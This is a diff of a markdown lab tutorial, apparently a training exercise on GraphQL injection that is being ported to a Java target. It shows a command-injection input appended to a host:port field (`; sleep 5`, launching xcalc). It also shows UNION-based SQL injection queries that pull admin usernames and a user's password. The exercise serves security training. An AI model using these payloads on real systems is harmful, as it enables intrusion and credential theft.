@@ -62,7 +62,7 @@ Go about and try check if some of the well known SQL Server ports are open on th
 
 Probablly your first try was MySQL 3306 - 127.0.0.1:3306. Play around with few other ports and IPs and observe the results we receive.
 
-![](../../.gitbook/assets/nodejs/Graphql-Injections/4.png)
+![](../../.gitbook/assets/java/Graphql-Injections/4.png)
 
 Now go ahead and try to execute some other system commands, append, pipe, ...
 
@@ -74,11 +74,15 @@ How about we try to a valid command that time effective and we can observe that.
 
 Let's try: `127.0.0.1:3306; sleep 5`
 
-![](../../.gitbook/assets/nodejs/Graphql-Injections/5.png)
+![](../../.gitbook/assets/java/Graphql-Injections/5.png)
 
-![](../../.gitbook/assets/nodejs/Graphql-Injections/6.png)
+![](../../.gitbook/assets/java/Graphql-Injections/6.png)
 
-As you have observed, the applciation took additional extra 5 seconds to respond, meaning our `sleep` command got executed. w00t, w00t!
+The application is taking a bit longer to reply, let's try another os command to make sure:
+
+![](../../.gitbook/assets/java/Graphql-Injections/7.png)
+
+As you have observed the `xcalc` command got executed and we were able to open the calculator. w00t, w00t!
 
 Now, it' up to you to come up with scenario how to further abuse this.
 
@@ -92,37 +96,27 @@ Now try to fetch some information for valid or invalid users. How about trying s
 
 ```
 Example:
-' UNION SELECT id, username, null FROM user --")
+' UNION SELECT id, null, null FROM user --")
 ```
 
-![](../../.gitbook/assets/nodejs/Graphql-Injections/7.png)
+![](../../.gitbook/assets/java/Graphql-Injections/8.png)
 
 By now we are aboslutly sure that this is an SQL Injection point and it is pretty that we are dealing with UNION style SQL Injection.
 Next up, let's try to find the other blog admins:
 
 ```
-{
-  getUser(username: "' UNION SELECT id, username, null FROM user WHERE admin = true --"){
-    id
-    username
-  }
-}
+{getUser(username:\"' UNION SELECT id, username,null FROM user WHERE admin = true --\"){id, username}}
 ```
 
-![](../../.gitbook/assets/nodejs/Graphql-Injections/8.png)
+![](../../.gitbook/assets/java/Graphql-Injections/9.png)
 
 Lets try to get the password of some user:
 
 ```
-{
-  getUser(username: "' UNION SELECT id, username, password FROM user WHERE username = 'johndoe'  --"){
-    id
-	username
-  }
-}
+{getUser(username:\"' UNION SELECT id, username, password FROM user WHERE username = 'johndoe' --\"){id, username}}
 ```
 
-![](../../.gitbook/assets/nodejs/Graphql-Injections/9.png)
+![](../../.gitbook/assets/java/Graphql-Injections/10.png)
 
 We face few hurdles here:
 
@@ -142,15 +136,10 @@ This means we need to get the password out from the UNION SELECT in another vari
 The laziest approach, if our target is to get the password, is to return in all fields:
 
 ```
-{
-  getUser(username: "' UNION SELECT password, password, password FROM user WHERE username = 'johndoe'  --"){
-    id
-    username
-  }
-}
+{getUser(username:\"' UNION SELECT password, password, password FROM user WHERE username = 'johndoe' --\"){id, username}}
 ```
 
-![](../../.gitbook/assets/nodejs/Graphql-Injections/10.png)
+![](../../.gitbook/assets/java/Graphql-Injections/11.png)
 
 w00t w00t!
 
